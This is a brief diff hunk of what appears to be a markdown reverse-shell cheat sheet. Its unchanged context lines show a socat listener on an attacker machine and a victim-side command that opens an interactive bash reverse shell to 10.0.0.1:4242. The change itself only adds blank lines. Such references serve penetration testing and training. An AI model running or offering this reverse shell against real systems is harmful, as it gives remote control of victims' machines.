@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:32.756749+00:00'
 user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
 user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
+
+
